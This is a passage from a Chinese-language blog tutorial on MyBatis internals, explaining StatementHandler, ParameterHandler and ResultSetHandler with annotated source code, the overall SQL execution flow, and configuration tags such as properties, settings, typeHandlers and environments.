<p><code>RoutingStatementHandler</code> : RoutingStatementHandler 并没有对 Statement 对象进行使用，只是根据 <code>StatementType</code> 来创建一个代理，代理的就是对应 Handler 的三种实现类。在MyBatis 工作时,使用的 <code>StatementHandler</code> 接口对象实际上就是 <code>RoutingStatementHandler</code> 对象。</p>
<p><code>BaseStatementHandler</code> : 是 <code>StatementHandler</code> 接口的另一个实现类，它本身是一个抽象类，用于简化 <code>StatementHandler</code> 接口实现的难度，属于适配器设计模式体现，它主要有三个实现类</p>
<ul>
<li><code>SimpleStatementHandler</code>: 管理 Statement 对象并向数据库中推送不需要预编译的SQL语句。</li>
<li><code>PreparedStatementHandler</code>: 管理 Statement 对象并向数据中推送需要预编译的SQL语句。</li>
<li><code>CallableStatementHandler</code>：管理 Statement 对象并调用数据库中的存储过程。</li>
</ul>
<blockquote>
<p>这里注意一下，<code>SimpleStatementHandler</code> 和 <code>PreparedStatementHandler</code> 的区别是 SQL 语句是否包含变量，是否通过外部进行参数传入。<code>SimpleStatementHandler</code> 用于执行没有任何参数传入的 SQL,<code>PreparedStatementHandler</code> 需要对外部传入的变量和参数进行提前参数绑定和赋值。</p>
</blockquote>
<h3 id="StatementHandler-的创建和源码分析"><a href="#StatementHandler-的创建和源码分析" class="headerlink" title="StatementHandler 的创建和源码分析"></a>StatementHandler 的创建和源码分析</h3><p>继续来分析上面 query 的调用链路，<code>StatementHandler</code> 的创建过程如下:</p>
<p><img src="http://qiniu.xiaoming.net.cn/StatementHandler%20%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.jpg" alt="StatementHandler 的创建和源码分析"></p>
<p>MyBatis 会根据 SQL 语句的类型进行对应 <code>StatementHandler</code> 的创建。以预处理 StatementHandler 为例，创建过程如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/PreparedStatementHandler%E5%88%9B%E5%BB%BA%E8%BF%87%E7%A8%8B.jpg" alt="PrepareStatementHandler创建过程"></p>
<p>执行器不仅掌管着 <code>StatementHandler</code> 的创建，还掌管着创建 <code>Statement</code> 对象，设置参数等，在创建完 <code>PreparedStatement</code> 之后，就需要对参数进行处理了。</p>
<p>综上，sql语句的执行流程如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E4%BB%8Eexecutor%E5%88%B0handler%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.jpg" alt="从executor到handler执行流程"></p>
<h2 id="ParameterHandler"><a href="#ParameterHandler" class="headerlink" title="ParameterHandler"></a>ParameterHandler</h2><h3 id="ParameterHandler-介绍"><a href="#ParameterHandler-介绍" class="headerlink" title="ParameterHandler 介绍"></a>ParameterHandler 介绍</h3><p><code>ParameterHandler</code> 相比于其他的组件就简单很多了，<code>ParameterHandler</code> 译为参数处理器，负责为 <code>PreparedStatement</code> 的 sql 语句参数动态赋值，这个接口很简单只有两个方法:</p>
<p><img src="http://qiniu.xiaoming.net.cn/ParameterHandler%E6%8E%A5%E5%8F%A3.jpg" alt="ParameterHandler接口"></p>
<p><code>ParameterHandler</code> 只有一个实现类 <code>DefaultParameterHandler</code> ， 它实现了这两个方法。</p>
<ul>
<li><code>getParameterObject</code>：用于读取参数</li>
<li><code>setParameters</code>: 用于对 <code>PreparedStatement</code> 的参数赋值</li>
</ul>
<h3 id="ParameterHandler-的解析过程"><a href="#ParameterHandler-的解析过程" class="headerlink" title="ParameterHandler 的解析过程"></a>ParameterHandler 的解析过程</h3><p>上面我们讨论过了 ParameterHandler 的创建过程，下面继续上面 <code>parameterSize</code> 流程：</p>
<p><img src="http://qiniu.xiaoming.net.cn/ParameterHandler%20%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.jpg" alt="ParameterHandler 的解析过程"></p>
<p>这就是具体参数的解析过程了，注释如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParameters</span><span class="params">(PreparedStatement ps)</span> </span>&#123;</span><br><span class="line">    ErrorContext.instance().activity(<span class="string">&quot;setting parameters&quot;</span>).object(mappedStatement.getParameterMap().getId());</span><br><span class="line">    <span class="comment">// parameterMappings 就是对 #&#123;&#125; 或者 $&#123;&#125; 里面参数的封装</span></span><br><span class="line">    List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings();</span><br><span class="line">    <span class="keyword">if</span> (parameterMappings != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果是参数化的SQL，便需要循环取出并设置参数的值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameterMappings.size(); i++) &#123;</span><br><span class="line">            ParameterMapping parameterMapping = parameterMappings.get(i);</span><br><span class="line">            <span class="comment">// 如果参数类型不是 OUT ，这个类型与 CallableStatementHandler 有关</span></span><br><span class="line">            <span class="comment">// 因为存储过程不存在输出参数，所以参数不是输出参数的时候，就需要设置。</span></span><br><span class="line">            <span class="keyword">if</span> (parameterMapping.getMode() != ParameterMode.OUT) &#123;</span><br><span class="line">                Object value;</span><br><span class="line">                <span class="comment">// 得到 #&#123;&#125;  中的属性名</span></span><br><span class="line">                String propertyName = parameterMapping.getProperty();</span><br><span class="line">                <span class="comment">// 如果 propertyName 是 Map 中的key</span></span><br><span class="line">                <span class="keyword">if</span> (boundSql.hasAdditionalParameter(propertyName)) &#123; <span class="comment">// issue #448 ask first for additional params</span></span><br><span class="line">                    <span class="comment">// 通过key 来得到 additionalParameter 中的value值</span></span><br><span class="line">                    value = boundSql.getAdditionalParameter(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果不是 additionalParameters 中的key，而且传入参数是 null， 则value 就是null</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (parameterObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    value = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果 typeHandlerRegistry 中已经注册了这个参数的 Class 对象，即它是 Primitive 或者是String 的话</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123;</span><br><span class="line">                    value = parameterObject;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 否则就是 Map</span></span><br><span class="line">                    MetaObject metaObject = configuration.newMetaObject(parameterObject);</span><br><span class="line">                    value = metaObject.getValue(propertyName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 在通过 SqlSource 的parse 方法得到parameterMappings 的具体实现中，我们会得到parameterMappings 的 typeHandler</span></span><br><span class="line">                TypeHandler typeHandler = parameterMapping.getTypeHandler();</span><br><span class="line">                <span class="comment">// 获取 typeHandler 的jdbc type</span></span><br><span class="line">                JdbcType jdbcType = parameterMapping.getJdbcType();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="keyword">null</span> &amp;&amp; jdbcType == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    jdbcType = configuration.getJdbcTypeForNull();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    typeHandler.setParameter(ps, i + <span class="number">1</span>, value, jdbcType);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (TypeException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> TypeException(<span class="string">&quot;Could not set parameters for mapping: &quot;</span> + parameterMapping + <span class="string">&quot;. Cause: &quot;</span> + e, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> TypeException(<span class="string">&quot;Could not set parameters for mapping: &quot;</span> + parameterMapping + <span class="string">&quot;. Cause: &quot;</span> + e, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面用一个流程图表示一下 ParameterHandler 的解析过程，以简单执行器为例：</p>
<p><img src="http://qiniu.xiaoming.net.cn/ParameterHandler%20%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg" alt="ParameterHandler 的解析过程流程图"></p>
<p>在完成 <code>ParameterHandler</code> 对 SQL 参数的预处理后，回到 <code>SimpleExecutor</code> 中的 <code>doQuery</code> 方法：</p>
<p><img src="http://qiniu.xiaoming.net.cn/SimpleExecutor%E4%B8%AD%E7%9A%84%20doQuery%E6%96%B9%E6%B3%95.jpg" alt="SimpleExecutor中的 doQuery方法"></p>
<p>上面又引出来了一个重要的组件那就是 <code>ResultSetHandler</code>。</p>
<h2 id="ResultSetHandler"><a href="#ResultSetHandler" class="headerlink" title="ResultSetHandler"></a>ResultSetHandler</h2><h3 id="ResultSetHandler-简介"><a href="#ResultSetHandler-简介" class="headerlink" title="ResultSetHandler 简介"></a>ResultSetHandler 简介</h3><p><code>ResultSetHandler</code> 也是一个非常简单的接口:</p>
<p><img src="http://qiniu.xiaoming.net.cn/ResultHandler%E6%8E%A5%E5%8F%A3.jpg" alt="ResultHandler接口"></p>
<p><code>ResultSetHandler</code> 是一个接口，它只有一个默认的实现类，像是 <code>ParameterHandler</code> 一样，它的默认实现类是 <code>DefaultResultSetHandler</code></p>
<h3 id="ResultSetHandler-解析过程"><a href="#ResultSetHandler-解析过程" class="headerlink" title="ResultSetHandler 解析过程"></a>ResultSetHandler 解析过程</h3><p>MyBatis 只有一个默认的实现类就是 <code>DefaultResultSetHandler</code>，<code>DefaultResultSetHandler</code> 主要负责处理两件事:</p>
<ul>
<li>处理 Statement 执行后产生的结果集，生成结果列表</li>
<li>处理存储过程执行后的输出参数</li>
</ul>
<p>按照 Mapper 文件中配置的 <code>ResultType</code> 或 <code>ResultMap</code> 来封装成对应的对象，最后将封装的对象返回即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Object&gt; <span class="title">handleResultSets</span><span class="params">(Statement stmt)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  ErrorContext.instance().activity(<span class="string">&quot;handling results&quot;</span>).object(mappedStatement.getId());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">final</span> List&lt;Object&gt; multipleResults = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> resultSetCount = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 获取第一个结果集</span></span><br><span class="line">  ResultSetWrapper rsw = getFirstResultSet(stmt);</span><br><span class="line">  <span class="comment">// 获取结果映射</span></span><br><span class="line">  List&lt;ResultMap&gt; resultMaps = mappedStatement.getResultMaps();</span><br><span class="line">  <span class="comment">// 结果映射的大小</span></span><br><span class="line">  <span class="keyword">int</span> resultMapCount = resultMaps.size();</span><br><span class="line">  <span class="comment">// 校验结果映射的数量</span></span><br><span class="line">  validateResultMapsCount(rsw, resultMapCount);</span><br><span class="line">  <span class="comment">// 如果ResultSet 包装器不是null， 并且 resultmap 的数量  &gt;  resultSet 的数量的话</span></span><br><span class="line">  <span class="comment">// 因为 resultSetCount 第一次肯定是0，所以直接判断 ResultSetWrapper 是否为 0 即可</span></span><br><span class="line">  <span class="keyword">while</span> (rsw != <span class="keyword">null</span> &amp;&amp; resultMapCount &gt; resultSetCount) &#123;</span><br><span class="line">    <span class="comment">// 从 resultMap 中取出 resultSet 数量</span></span><br><span class="line">    ResultMap resultMap = resultMaps.get(resultSetCount);</span><br><span class="line">    <span class="comment">// 处理结果集, 关闭结果集</span></span><br><span class="line">    handleResultSet(rsw, resultMap, multipleResults, <span class="keyword">null</span>);</span><br><span class="line">    rsw = getNextResultSet(stmt);</span><br><span class="line">    cleanUpAfterHandlingResultSet();</span><br><span class="line">    resultSetCount++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 从 mappedStatement 取出结果集</span></span><br><span class="line">  String[] resultSets = mappedStatement.getResultSets();</span><br><span class="line">  <span class="keyword">if</span> (resultSets != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (rsw != <span class="keyword">null</span> &amp;&amp; resultSetCount &lt; resultSets.length) &#123;</span><br><span class="line">      ResultMapping parentMapping = nextResultMaps.get(resultSets[resultSetCount]);</span><br><span class="line">      <span class="keyword">if</span> (parentMapping != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String nestedResultMapId = parentMapping.getNestedResultMapId();</span><br><span class="line">        ResultMap resultMap = configuration.getResultMap(nestedResultMapId);</span><br><span class="line">        handleResultSet(rsw, resultMap, <span class="keyword">null</span>, parentMapping);</span><br><span class="line">      &#125;</span><br><span class="line">      rsw = getNextResultSet(stmt);</span><br><span class="line">      cleanUpAfterHandlingResultSet();</span><br><span class="line">      resultSetCount++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> collapseSingleResultList(multipleResults);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中涉及的主要对象有：</p>
<ul>
<li><code>ResultSetWrapper</code> : 结果集的包装器，主要针对结果集进行的一层包装，它的主要属性有</li>
<li><code>ResultSet</code> : Java JDBC ResultSet 接口表示数据库查询的结果。有关查询的文本显示了如何将查询结果作为java.sql.ResultSet 返回。然后迭代此ResultSet以检查结果。</li>
<li><code>TypeHandlerRegistry</code>: 类型注册器，TypeHandlerRegistry 在初始化的时候会把所有的 Java类型和类型转换器进行注册。</li>
<li><code>ColumnNames</code>: 字段的名称，也就是查询操作需要返回的字段名称</li>
<li><code>ClassNames</code>: 字段的类型名称，也就是 ColumnNames 每个字段名称的类型</li>
<li><code>JdbcTypes</code>: JDBC 的类型，也就是 java.sql.Types 类型</li>
<li><code>ResultMap</code>: 负责处理更复杂的映射关系</li>
</ul>
<p>在 <code>DefaultResultSetHandler</code> 中处理完结果映射，并把上述结构返回给调用的客户端，从而执行完成一条完整的SQL语句。</p>
<h2 id="SQL-执行过程总结"><a href="#SQL-执行过程总结" class="headerlink" title="SQL 执行过程总结"></a>SQL 执行过程总结</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String resource = <span class="string">&quot;org/mybatis/example/mybatis-config.xml&quot;</span>;</span><br><span class="line">InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">SqlSession sqlSession = sqlSessionFactory.openSession();</span><br><span class="line">DeptDao deptDao = sqlSession.getMapper(DeptDao.class);</span><br></pre></td></tr></table></figure>

<p>首先是 <code>SqlSessionFactory</code> 的创建：</p>
<p>由上面可以看到通过 一个 <code>SqlSessionFactoryBuilder</code> 工厂，这是一个建造者模式的设计思想，由 <code>builder</code> 建造者来创建 <code>SqlSessionFactory</code> 工厂</p>
<p>然后调用 <code>SqlSessionFactoryBuilder</code> 中的 <code>build</code> 方法传递一个 <code>InputStream</code> 输入流，<code>Inputstream</code> 输入流中就是你传过来的配置文件 <code>mybatis-config.xml</code>，<code>SqlSessionFactoryBuilder</code> 根据传入的 <code>InputStream</code> 输入流和 <code>environment</code>、<code>properties</code> 属性创建一个 <code>XMLConfigBuilder</code> 对象，然后调用 <code>XMLConfigBuilder</code> 的 <code>parse()</code> 方法，该方法首先创建一个 <code>XMLConfigBuilder</code> 对象，通过这个对象的 <code>parser()</code> 方法对 xml 文件从 <code>configuration</code> 节点进行解析，对一个属性都对应一个解析方法，都是使用 XPath 把标签进行解析，解析完成后将这个配置好的 <code>configuration</code> 放到工厂的 <code>configuration</code> 变量里，最终 <code>build</code> 方法返回一个 <code>DefaultSqlSessionFactory</code> 对象，它是 <code>SqlSessionFactory</code> 的默认实现类。</p>
<p>接着是 <code>SqlSession</code> 的创建：</p>
<p>通过 <code>SqlSessionFactory</code> 工厂的 <code>openSession</code> 方法可以获取到一个 <code>SqlSession</code> ，该方法通过调用 <code>DefaultSqlSessionFactory</code> 的 <code>openSessionFromDataSource</code> 方法，会配置好 <code>configuration</code>、<code>executor</code> 执行器、事务属性等，然后传入 <code>DefaultSqlSession</code> 的构造方法创建出 <code>DefaultSqlSession</code> 。</p>
<p><code>Executor</code> 的创建：</p>
<p><code>Executor</code> 的创建是在创建 <code>SqlSession</code> 过程中，<code>openSessionFromDataSource</code> 会利用配置好的 <code>Configuration</code> 对象创建 <code>Executor</code> 对象，<code>Configuration</code> 会根据传入的执行器的类型创建相应的执行器。</p>
<p>再接下来是 Dao 层接口和 SQL 语句的绑定：</p>
<p><code>SqlSession</code> 的 <code>getMapper</code> 方法会调用 <code>Configuration</code> 的 <code>getMapper</code> 方法，其又会调用 <code>MapperRegistry</code> 中的 <code>getMapper</code> 方法，在这个方法中，会将 <code>Class</code> 作为参数构建 <code>MapperProxyFactory</code>，接着通过动态代理调用 <code>MapperProxyFactory</code> 的 <code>newInstance</code> 方法把当前 <code>sqlSession</code>传入，从而实现 <code>Dao</code> 和 <code>Sql</code> 的绑定。</p>
<p><code>MapperProxyFactory</code> 会生成代理对象，这个对象就是 <code>MapperProxy</code>,其中 <code>invoke</code> 方法中，就实现了相应的绑定方法，其实现调用到 <code>mapperMethod.execute</code> 方法，这个方法判断是插入、更新、删除还是查询语句，然后调用 <code>sqlSession</code> 相应的方法，其中如果是查询的话，还会判断返回值的类型。以 <code>selectList</code> 为例，其方法最后调用的是 <code>executor</code> 执行器的 <code>query</code> 方法。</p>
<p><code>Executor</code> 具体执行过程：</p>
<p>首先调用的是 <code>CachingExecutor</code> 的 <code>query</code> 方法，先从缓存中查询 SQL 是否是第一次执行，如果是第一次执行的话（<code>cache == null</code>)，那么就直接执行 SQL 语句，并创建缓存，如果第二次访问相同的 SQL 语句的话，那么就会直接从缓存中提取。</p>
<p>在找不到缓存的情况下，会重新创建 <code>Executor</code> 执行器来执行 SQL 语句，首先调用 <code>BaseExecutor</code> 的 <code>queryFromDatabase</code> 方法，该方法又会调用 <code>SimpleExecutor</code> 的 <code>doQuery</code> 方法，在这个方法里，会获取 <code>Configuration</code> 并通过 <code>Configuration</code> 获取 <code>StatementHandler</code> 处理器，由它来继续往下执行。<code>Configuration</code> 会根据 SQL 语句的类型进行对应 <code>StatementHandler</code> 的创建。</p>
<p>之后会调用 <code>Executor</code> 中的 <code>preparedStatement</code>方法，该方法会调用传入的 <code>StatementHandler</code> 的 <code>prepare</code> 方法获取一个 <code>PreparedStatement</code> 对象，同时调用 <code>handler</code> 的 <code>parameterize</code> 方法，该方法会调用 <code>ParameterHandler</code> 的 <code>setParameters</code> 方法将 <code>PreparedStatement</code>传入，用于为 <code>PreparedStatement</code> 的 sql 语句参数动态赋值。</p>
<p>在完成 <code>ParameterHandler</code> 对 SQL 参数的预处理后，回到 <code>SimpleExecutor</code> 中继续往下执行，会执行 <code>PreparedStatementHandler</code> 的 <code>doQuery</code> 方法，该方法中 <code>PreparedStatement</code> 执行 <code>execute</code> 方法进行查询，然后通过 <code>ResultSetHandler</code> 的 <code>handleResultSets</code> 对会返结果集进行处理并返回，这就完成了一次完整的 SQL 执行过程。</p>
<h1 id="4-configuration标签下有哪些标签？"><a href="#4-configuration标签下有哪些标签？" class="headerlink" title="4. configuration标签下有哪些标签？"></a>4. configuration标签下有哪些标签？</h1><h2 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h2><p>外部属性，这些属性都是可外部配置且可动态替换的，既可以在典型的 Java 属性文件中配置，亦可通过 properties 元素的子元素来传递。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一般用来给 environment 标签中的 dataSource 赋值</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="settings"><a href="#settings" class="headerlink" title="settings"></a>settings</h2><p>MyBatis 中极其重要的配置，它们会改变 MyBatis 的运行时行为。</p>
<p>settings 中配置有很多。这里介绍几个平常使用过程中比较重要的配置：</p>
<p><img src="http://qiniu.xiaoming.net.cn/myBatis%20setting%E8%8A%82%E7%82%B9%E5%86%85%E5%AE%B9.jpg" alt="MyBatis中Setting节点内容"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="typeAliases"><a href="#typeAliases" class="headerlink" title="typeAliases"></a>typeAliases</h2><p>类型别名，类型别名是为 Java 类型设置的一个名字。它只和 XML 配置有关。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">alias</span>=<span class="string">&quot;Blog&quot;</span> <span class="attr">type</span>=<span class="string">&quot;domain.blog.Blog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当这样配置时，Blog 可以用在任何使用 <code>domain.blog.Blog</code> 的地方。</p>
<h2 id="typeHandlers"><a href="#typeHandlers" class="headerlink" title="typeHandlers"></a>typeHandlers</h2><p>类型处理器，无论是 MyBatis 在预处理语句（PreparedStatement）中设置一个参数时，还是从结果集中取出一个值时， 都会用类型处理器将获取的值以合适的方式转换成 Java 类型。</p>
<p>在 <code>org.apache.ibatis.type</code> 包下有很多已经实现好的 TypeHandler，可以参考如下:</p>
<p><img src="http://qiniu.xiaoming.net.cn/MyBatis%E5%AE%9E%E7%8E%B0%E5%A5%BD%E7%9A%84%20TypeHandler.jpg" alt="MyBatis 实现好的 TypeHandler"></p>
<p>可以重写类型处理器或创建自己的类型处理器来处理不支持的或非标准的类型。</p>
<p>具体做法为：实现 <code>org.apache.ibatis.type.TypeHandler</code> 接口， 或继承一个很方便的类 <code>org.apache.ibatis.type.BaseTypeHandler</code>， 然后可以选择性地将它映射到一个 JDBC 类型。</p>
<h2 id="objectFactory"><a href="#objectFactory" class="headerlink" title="objectFactory"></a>objectFactory</h2><p>对象工厂，MyBatis 每次创建结果对象的新实例时，它都会使用一个对象工厂（ObjectFactory）实例来完成。默认的对象工厂需要做的仅仅是实例化目标类，要么通过默认构造方法，要么在参数映射存在的时候通过参数构造方法来实例化。如果想覆盖对象工厂的默认行为，则可以通过创建自己的对象工厂来实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleObjectFactory</span> <span class="keyword">extends</span> <span class="title">DefaultObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">create</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.create(type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">create</span><span class="params">(Class type, List&lt;Class&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.create(type, constructorArgTypes, constructorArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProperties</span><span class="params">(Properties properties)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.setProperties(properties);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isCollection</span><span class="params">(Class&lt;T&gt; type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Collection.class.isAssignableFrom(type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后需要在 XML 中配置此对象工厂</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">objectFactory</span> <span class="attr">type</span>=<span class="string">&quot;org.mybatis.example.ExampleObjectFactory&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;someProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">objectFactory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h2><p>插件开发，插件开发是 MyBatis 设计人员给开发人员留给自行开发的接口，MyBatis 允许在已映射语句执行过程中的某一点进行拦截调用。MyBatis 允许使用插件来拦截的方法调用包括：<code>Executor</code>、<code>ParameterHandler</code>、<code>ResultSetHandler</code>、<code>StatementHandler</code> 接口，这几个接口也是 MyBatis 中非常重要的接口。</p>
<h2 id="environments"><a href="#environments" class="headerlink" title="environments"></a>environments</h2><p>MyBatis 环境配置，MyBatis 可以配置成适应多种环境，这种机制有助于将 SQL 映射应用于多种数据库之中。例如，开发、测试和生产环境需要有不同的配置；或者想在具有相同 Schema 的多个生产数据库中使用相同的 SQL 映射。</p>
<p>这里注意一点，虽然 environments 可以指定多个环境，但是 SqlSessionFactory 只能有一个，为了指定创建哪种环境，只要将它作为可选的参数传递给 SqlSessionFactoryBuilder 即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SqlSessionFactory factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(reader, environment);</span><br><span class="line">SqlSessionFactory factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(reader, environment, properties);</span><br></pre></td></tr></table></figure>

<p>环境配置如下:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;...&quot;</span> <span class="attr">value</span>=<span class="string">&quot;...&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">            <span 